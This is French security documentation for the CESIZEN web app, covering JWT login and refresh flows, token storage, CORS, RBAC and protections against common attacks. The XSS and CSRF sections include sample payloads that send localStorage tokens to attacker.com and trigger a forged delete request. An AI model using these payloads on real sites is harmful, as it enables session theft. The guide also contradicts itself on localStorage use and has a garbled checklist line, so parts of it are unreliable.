# 🔐 03 - Sécurité et authentification JWT

**Temps de lecture** : 15-20 minutes  
**Public cible** : Développeurs, Security Team  
**Dernière mise à jour** : 21 Avril 2026

---

## 🎯 Vue d'ensemble sécurité

### Principes de sécurité appliqués

```
┌─────────────────────────────────────────────────┐
│   PRINCIPES DE SÉCURITÉ - CESIZEN              │
├─────────────────────────────────────────────────┤
│                                                 │
│ 🔒 CONFIDENTIALITÉ                              │
│ ├─ Chiffrement HTTPS/TLS (prod)                │
│ ├─ Tokens JWT sécurisés                        │
│ ├─ Variables sensibles en .env                 │
│ └─ Pas de données sensibles en localStorage    │
│                                                 │
│ 🛡️ INTÉGRITÉ                                    │
│ ├─ Validation CSRF tokens                      │
│ ├─ Signature JWT                               │
│ ├─ Content-Security-Policy headers             │
│ └─ Type validation avec TypeScript             │
│                                                 │
│ 🔑 AUTHENTIFICATION                             │
│ ├─ JWT Bearer tokens                           │
│ ├─ Refresh token rotation                      │
│ ├─ Token expiration courte (15 min)            │
│ └─ Secure cookie for refresh token             │
│                                                 │
│ 🚪 AUTORISATION                                 │
│ ├─ Role-Based Access Control (RBAC)           │
│ ├─ Route guards (AdminGuard)                   │
│ ├─ API-level permissions                       │
│ └─ Resource-level checks                       │
│                                                 │
│ 🛡️ PROTECTION CONTRE ATTAQUES                   │
│ ├─ XSS: CSP headers, sanitization             │
│ ├─ CSRF: SameSite cookies                      │
│ ├─ Injection: Prepared statements              │
│ ├─ Brute force: Rate limiting                  │
│ └─ SSRF: Input validation                      │
│                                                 │
└─────────────────────────────────────────────────┘
```

---

## 🔑 Système JWT (JSON Web Tokens)

### Structure d'un JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

│ HEADER │            PAYLOAD              │       SIGNATURE       │
└─────────────────────────────────────────────────────────────────┘
```

### 🟦 1. HEADER (En-tête)

```json
{
  "alg": "HS256",           // Algorithme signature
  "typ": "JWT"              // Type de token
}
```

### 🟩 2. PAYLOAD (Charge utile)

```json
{
  // Claims standard
  "sub": "user-123",        // Subject (user ID)
  "email": "user@email.fr",
  "role": "user",
  "iat": 1704067200,        // Issued at (timestamp)
  "exp": 1704068100,        // Expiration (timestamp)
  
  // Custom claims
  "type": "access",         // access | refresh
  "tokenVersion": 1,        // Pour invalidation
  "permissions": ["read", "write"]
}
```

### 🟥 3. SIGNATURE

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret_key
)
```

---

## 🔄 Flux d'authentification complet

### 1️⃣ CONNEXION (Login)

```
┌──────────────────────────────────┐
│   User remplit form LOGIN        │
├──────────────────────────────────┤
│ Email: user@email.fr             │
│ Password: *****                  │
└──────────────────┬───────────────┘
                   │
        ┌──────────▼─────────┐
        │ Validation locale  │
        │ (Zod schema)       │
        └──────────┬─────────┘
                   │
    ┌──────────────▼──────────────┐
    │ POST /api/auth/login        │
    │ {                           │
    │   "email": "user@...",      │
    │   "password": "..."         │
    │ }                           │
    └──────────────┬──────────────┘
                   │
        ┌──────────▼──────────────┐
        │ Backend validation:      │
        │ ✓ Email exists?         │
        │ ✓ Password correct?     │
        │ ✓ Account active?       │
        └──────────┬──────────────┘
                   │
        ┌──────────▼──────────────────────────────┐
        │ Générer tokens:                         │
        │ • accessToken (15 min)                  │
        │ • refreshToken (7 jours)                │
        └──────────┬──────────────────────────────┘
                   │
    ┌──────────────▼──────────────────────────┐
    │ Response 200 OK:                        │
    │ {                                       │
    │   "accessToken": "eyJhbg...",          │
    │   "refreshToken": "eyJ0...",           │
    │   "user": { ... },                      │
    │   "expiresIn": 900                      │
    │ }                                       │
    └──────────┬───────────────────────────────┘
               │
    ┌──────────▼──────────────────────┐
    │ Client stockage:                 │
    │ • accessToken → localStorage     │
    │ • refreshToken → httpOnly cookie │
    │ • user → Zustand store           │
    └──────────────────────────────────┘
```

### 2️⃣ REQUÊTE AUTHENTIFIÉE

```
┌──────────────────────────────────────┐
│  GET /api/users/me                  │
├──────────────────────────────────────┤
│  Headers:                            │
│  Authorization: Bearer <accessToken> │
│  Content-Type: application/json      │
└──────────────────┬───────────────────┘
                   │
        ┌──────────▼─────────────────┐
        │ Interceptor HTTP client    │
        │ Ajoute Authorization header│
        │ + token depuis localStorage │
        └──────────┬──────────────────┘
                   │
        ┌──────────▼────────────────────┐
        │ Backend JWT verification:     │
        │ ✓ Token valide?               │
        │ ✓ Signature correcte?         │
        │ ✓ Pas expiré?                 │
        │ ✓ User toujours actif?        │
        └──────────┬─────────────────────┘
                   │
            ┌──────▼──────┐
            │ ✓ ACCÈS ✓   │
            │ Retour 200  │
            └─────────────┘
```

### 3️⃣ TOKEN EXPIRÉ - REFRESH

```
┌─────────────────────────────────┐
│  GET /api/articles              │
│  Authorization: Bearer <EXPIRED>│
└──────────────────┬──────────────┘
                   │
        ┌──────────▼──────────────────┐
        │ Backend retourne 401        │
        │ Error: "Token expired"      │
        └──────────┬─────────────────┘
                   │
        ┌──────────▼─────────────────────────────┐
        │ Client Error Handler:                  │
        │ if (error.status === 401) {            │
        │   Émettre POST /api/auth/refresh       │
        │ }                                       │
        └──────────┬────────────────────────────┘
                   │
    ┌──────────────▼──────────────────────────┐
    │ POST /api/auth/refresh                  │
    │ Body: { refreshToken }                  │
    │ Cookie: httpOnly(refreshToken)          │
    └──────────┬───────────────────────────────┘
               │
    ┌──────────▼──────────────────────┐
    │ Backend valide refreshToken     │
    │ ✓ Valide?                       │
    │ ✓ Pas expiré?                   │
    │ ✓ Version match?                │
    │ ✓ User toujours actif?          │
    └──────────┬──────────────────────┘
               │
        ┌──────▼──────────────────────────┐
        │ Nouveau accessToken généré     │
        │ Response: { accessToken, ... } │
        └──────┬───────────────────────────┘
               │
        ┌──────▼──────────────────────────┐
        │ Client MAJ localStorage        │
        │ Retry requête originale        │
        │ GET /api/articles (nouveau JWT)│
        └──────┬───────────────────────────┘
               │
        ┌──────▼─────────┐
        │ ✓ SUCCÈS ✓     │
        │ Retour 200     │
        └────────────────┘
```

### 4️⃣ DÉCONNEXION (Logout)

```
┌────────────────────────────────────┐
│ User clique "Déconnexion"          │
└────────────────────┬───────────────┘
                     │
        ┌────────────▼─────────────┐
        │ POST /api/auth/logout    │
        │ (optionnel, backend)     │
        └────────────┬──────────────┘
                     │
        ┌────────────▼──────────────────────┐
        │ Client cleanup:                   │
        │ 1. Effacer localStorage           │
        │ 2. Effacer Zustand store          │
        │ 3. Effacer cookies                │
        │ 4. Redirection /auth/connexion    │
        └────────────┬───────────────────────┘
                     │
        ┌────────────▼──────────────┐
        │ ✓ Session fermée        │
        │ ✓ User complètement déco│
        └───────────────────────────┘
```

---

## 📊 Détails techniques JWT - Implémentation

### Access Token

```typescript
interface AccessTokenPayload {
  // Claims standard (RFC 7519)
  sub: string              // Subject = user ID
  email: string
  role: "user" | "admin"
  iat: number             // Issued at (seconds since epoch)
  exp: number             // Expiration (iat + 900 = 15 min)
  
  // Custom claims
  type: "access"
  tokenVersion: number
  permissions?: string[]
}
```

**Durée de vie** : 15 minutes  
**Stockage** : localStorage  
**Envoi** : Authorization header (Bearer token)  
**Risque** : Accessible via XSS (mais durée courte mitigue)  

### Refresh Token

```typescript
interface RefreshTokenPayload {
  sub: string              // Subject = user ID
  type: "refresh"
  iat: number
  exp: number             // iat + 604800 = 7 jours
  tokenVersion: number    // Permet invalidation
  
  // Pas d'autres infos sensibles
}
```

**Durée de vie** : 7 jours  
**Stockage** : httpOnly Secure Cookie  
**Envoi** : Automatique dans cookies  
**Risque** : Protégé contre XSS (httpOnly)  

### Token Rotation Strategy

```
Scenario: Refresh Token volé ?

1. Backend peut invalider rapidement:
   - Incrémenter tokenVersion en DB
   - Tous les tokens avec ancienne version = rejetés
   - User doit se reconnecter

2. Cleanup automatique:
   - Old tokens expirés après 7 jours
   - Sessions inactives supprimées après 30 jours
   - Login historique gardé 90 jours
```

---

## 🌐 CORS (Cross-Origin Resource Sharing)

### Configuration CORS côté frontend

```typescript
// lib/api/http-client.ts
const response = await fetch(`${API_BASE_URL}${path}`, {
  method,
  headers,
  body: body ? JSON.stringify(body) : undefined,
  credentials: "include",  // 🔑 Important!
  cache: "no-store",
})
```

**`credentials: "include"`** signifie:
- Envoyer les cookies automatiquement
- Inclure httpOnly Secure cookies
- Backend reçoit credentials

### Configuration CORS côté backend (exemple Node.js)

```javascript
// Backend (exemple)
app.use(cors({
  origin: process.env.FRONTEND_URL,
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"]
}))
```

**Important** :
- `origin` = URL frontend exacte (pas "*" avec credentials)
- `credentials: true` = accepte les cookies
- `Access-Control-Allow-Credentials: true` header

---

## 🔒 Stockage sécurisé des tokens

### ❌ PAS BON: Stocker refresh token en localStorage

```javascript
// ❌ MAUVAIS - Vulnérable XSS
localStorage.setItem("refreshToken", token)
```

Pourquoi? Un script malveillant peut accéder:
```javascript
// XSS attack
const token = localStorage.getItem("refreshToken")
// Envoyer au serveur attacker
fetch("https://attacker.com", { body: token })
```

### ✅ BON: httpOnly Secure Cookie pour refresh token

```javascript
// ✅ BON - Backend envoie:
Set-Cookie: refreshToken=<token>; 
            HttpOnly; 
            Secure; 
            SameSite=Strict; 
            Max-Age=604800
```

**Propriétés**:
- **HttpOnly** : JavaScript ne peut pas accéder
- **Secure** : Uniquement en HTTPS
- **SameSite=Strict** : Protection CSRF
- **Max-Age** : 7 jours

### Stockage recommandé

| Token | Où | Risques | Mitigation |
|-------|-----|---------|-----------|
| **Access Token** | localStorage | XSS | Courte durée (15 min) |
| **Refresh Token** | httpOnly Cookie | CSRF | SameSite=Strict |

---

## 🛡️ Protection contre les attaques courantes

### 1️⃣ XSS (Cross-Site Scripting)

**Attaque**:
```javascript
// Injecter un script malveillant
<img src=x onerror="fetch('http://attacker.com?token='+localStorage.token)">
```

**Protection - CMS (Content Security Policy)**:
```
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'trusted-domain';
  object-src 'none';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.cesizen.com;
```

**Protection - Frontend**:
```typescript
// ✅ Safer: HTML-escape user content
const displayName = escapeHtml(user.name)

// ❌ Risqué: Afficher raw HTML
<div dangerouslySetInnerHTML={{ __html: user.bio }} />
```

### 2️⃣ CSRF (Cross-Site Request Forgery)

**Attaque**:
```html
<!-- Attacker website -->
<img src="https://cesizen.com/api/users/delete?id=123">
<!-- Browser envoie credentials automatiquement! -->
```

**Protection - SameSite Cookie**:
```
Set-Cookie: token=...; SameSite=Strict
```

Valeurs:
- **Strict** : Cookie envoyé UNIQUEMENT same-site
- **Lax** : Cookie envoyé en navigation top-level
- **None** : Cookie toujours envoyé (nécessite Secure)

### 3️⃣ Token Theft (Vol de token)

**Attaque**: Vol du token et réutilisation

**Protection**:
```
1. Durée courte (15 min)
2. Invalidation rapide
3. Binding à IP/User-Agent (optionnel)
4. Rotation token à chaque refresh
5. Logs et alertes suspectes
```

### 4️⃣ Brute Force

**Attaque**: Essayer multiples passwords
```
POST /api/auth/login - 1000 fois
```

**Protection**: Rate limiting
```
- Max 5 tentatives par email/IP par 15 min
- Progressif backoff (1s, 2s, 4s, 8s...)
- Captcha après 3 échecs
- Alerter user en email après 10 tentatives
```

---

## 👥 RBAC (Role-Based Access Control)

### Rôles définis

```typescript
type Role = "user" | "admin" | "moderator"

interface RolePermissions {
  user: {
    canReadArticles: true
    canWriteComments: true
    canEditProfile: true
    canDeleteAccount: true
    canAccessAdmin: false
    canModerateUsers: false
    canManageArticles: false
  }
  
  admin: {
    canReadArticles: true
    canWriteComments: true
    canEditProfile: true
    canDeleteAccount: true
    canAccessAdmin: true
    canModerateUsers: true
    canManageArticles: true
    canAccessLogs: true
  }
}
```

### Matrice d'accès (RBAC Matrix)

| Ressource/Action | Public | User | Admin |
|-----------------|--------|------|-------|
| **Articles READ** | ✅ | ✅ | ✅ |
| **Articles CREATE** | ❌ | ❌ | ✅ |
| **Articles EDIT** | ❌ | ❌ | ✅ |
| **Articles DELETE** | ❌ | ❌ | ✅ |
| **Profil READ (self)** | ❌ | ✅ | ✅ |
| **Profil EDIT (self)** | ❌ | ✅ | ✅ |
| **Profil READ (others)** | ❌ | ❌ | ✅ |
| **Users LIST** | ❌ | ❌ | ✅ |
| **Users DELETE** | ❌ | ❌ | ✅ |
| **Admin PANEL** | ❌ | ❌ | ✅ |
| **Analytics** | ❌ | ❌ | ✅ |
| **Logs** | ❌ | ❌ | ✅ |

### Protection côté frontend (AdminGuard)

```typescript
// components/app/admin-guard.tsx
import { useAuthStore } from "@/lib/auth/use-session"

export function AdminGuard({ children }) {
  const { user } = useAuthStore()
  
  if (user?.role !== "admin") {
    return <NotAuthorized />
  }
  
  return children
}

// Utilisation
<AdminGuard>
  <AdminPanel />
</AdminGuard>
```

**Important** : Cette protection est COSMÉTIQUE  
Vrai protection = Vérification backend sur CHAQUE request!

### Protection côté backend (exemple pseudo-code)

```javascript
// GET /api/admin/users - Backend
if (user.role !== "admin") {
  return res.status(403).json({ error: "Forbidden" })
}

const users = await db.users.findAll()
return res.json(users)
```

---

## 🔍 Audit et monitoring

### Événements sécurité à logger

```typescript
interface SecurityEvent {
  id: string
  timestamp: Date
  type: 
    | "LOGIN_SUCCESS"
    | "LOGIN_FAILED"
    | "TOKEN_REFRESH"
    | "TOKEN_REVOKED"
    | "UNAUTHORIZED_ACCESS"
    | "ADMIN_ACCESS"
    | "PASSWORD_CHANGED"
    | "2FA_ENABLED"
  
  userId: string
  ipAddress: string
  userAgent: string
  metadata?: object
}

// Exemples
{
  type: "LOGIN_FAILED",
  userId: null,
  reason: "Invalid password",
  ipAddress: "192.168.1.1"
}

{
  type: "UNAUTHORIZED_ACCESS",
  userId: "user-123",
  attemptedResource: "/api/admin/users",
  reason: "Insufficient permissions"
}
```

### Alertes recommandées

```
⚠️ ALERTER SI:
- 5+ failed login attempts en 15 min
- Login depuis nouvel IP
- Login depuis nouveau pays
- Admin access en dehors heures
- Mass deletion d'articles/users
- Nombreuses tentatives accès non-autorisé
```

---

## 📋 Checklist Sécurité

```
✅ AVANT PRODUCTION:

Authentification:
☐ JWT signature validée
☐ Token expiration implémentée
☐ Refresh token rotation
☐ HttpOnly Secure cookies
☐ Logout clears tous les tokens

CORS:
☐ Whitelist d'origins spécifiques
☐ credentials: true configuré
☐ Pas de Access-Control-Allow-Origin: *

Protection attaques:
☐ Rate limiting login (5 tentatives/15min)
☐ CSRF tokens ou SameSite cookies
☐ CSP headers
☐ HTTPS/TLS enforced
☐ SQL injection prevention
☐ XSS prevention (sanitization)

Données sensibles:
☐ Passwords hashés (Bcrypt)
☐ Pas de tokens en logs
☐ Pas de sensible data en localStorage
☐ .env.local en .gitignore

Monitoring:
☐ Logs de sécurité
☐ Alertes anomalies
☐ Audit trail
☐ User consent (RGPD)

Compliance:
☐ RGPD: Consentement explicite
☐ CNIL: Politique confidentialité
☐ AccessibilityNo passwords in cookies
```

---

## 🔗 Voir aussi

- [04-auth.md](./04-auth.md) - Implémentation des formulaires
- [13-exemples-integration.md](./13-exemples-integration.md) - Exemples code
- [NAVIGATION.md](./NAVIGATION.md) - FAQ Sécurité

---

**Version** : 1.0.0  
**Dernière mise à jour** : 21 Avril 2026

